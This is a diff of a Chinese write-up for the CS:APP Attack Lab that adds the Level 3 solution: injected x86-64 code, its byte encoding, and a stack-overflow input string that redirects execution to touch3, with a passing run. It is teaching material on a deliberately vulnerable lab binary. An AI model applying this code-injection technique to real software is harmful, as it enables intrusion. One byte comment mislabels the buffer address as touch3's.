@@ -98,7 +98,7 @@ PASS: Would have posted the following:
 
 ![](https://s3.ax1x.com/2021/01/02/rzb9i9.png)
 
-你的任务是`getbuf`函数之后跳转到`touch2`函数而不是返回`test`函数。你需要将你的`cookie`传入到`touch2`函数。实验文件夹下有一个的`cookie.txt`，记录了你的`cookie`。
+你的任务是`getbuf`函数之后执行到`touch2`函数而不是返回`test`函数。你需要将你的`cookie`传入到`touch2`函数。实验文件夹下有一个的`cookie.txt`，记录了你的`cookie`。
 
 思路仍是在复写堆栈中返回地址字节序列。我们可以利用字符串空间注入代码，将返回地址执行字符串首地址执行注入代码从而跳转到`touch2`函数。
 
@@ -186,3 +186,73 @@ PASS: Would have posted the following:
 	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
 ```
 
+### Level3
+
+阶段3依然包含一个代码注入攻击但传递的参数是字符串。
+
+![](https://s3.ax1x.com/2021/01/02/sSej9s.png)
+
+![](https://s3.ax1x.com/2021/01/02/sSm9BT.png)
+
+你的任务是执行`touch3`而不是返回`test`函数，将`cookie`作为函数参数传递给`touch3`函数。
+
+与**Level2**的区别是：
+
+1. 传递的参数不是一个立即数，而是一个地址。
+2. 在`hexmatch`函数中会申请110个字节的栈空间，这有可能覆盖`getbuf`字符串空间。
+
+所以我们不能讲`cookie`的值存在字符串空间内，我们可以存在`test`函数的栈帧中这样就不会被后面调用的函数破坏。
+
+`cookie`对应的字节序列是`35 39 62 39 39 37 66 61`。
+
+我们通过gdb调试可以得到字符串的地址是`0x5561dc78`，字符串开辟的空间是`0x28`，我们将`%rsp+0x28`处写入字符串的地址，在`%rsp+0x30`处（该处为test函数的栈帧）写入`cookie`字符串序列。
+
+创建注入代码`attack3.s`。
+
+```assembly
+movq $0x5561dca8,%rdi # 将cookie字符串地址赋给%rdi
+pushq $0x4018fa # touch3函数的首地址
+retq
+```
+
+然后编译成目标代码，反汇编得到注入代码指令字节序列。
+
+```bash
+root@5139ac651595:/csapp/target1# gcc -c attack3.s
+root@5139ac651595:/csapp/target1# objdump -d attack3.o
+
+attack3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
+   7:	68 fa 18 40 00       	pushq  $0x4018fa
+   c:	c3                   	retq
+```
+
+我们便可以构造输入字符串序列。
+
+```bash
+48 c7 c7 a8 dc 61 55 68 # 注入代码 %rsp
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 # touch3函数地址 %rsp + 28
+35 39 62 39 39 37 66 61 # cookie字符串字节序列 %rsp + 30 test函数栈帧
+```
+
+```bash
+root@5139ac651595:/csapp/target1# ./hex2raw < attack3.txt > attackraw3.txt
+root@5139ac651595:/csapp/target1# ./ctarget -q -i attackraw3.txt
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
+```
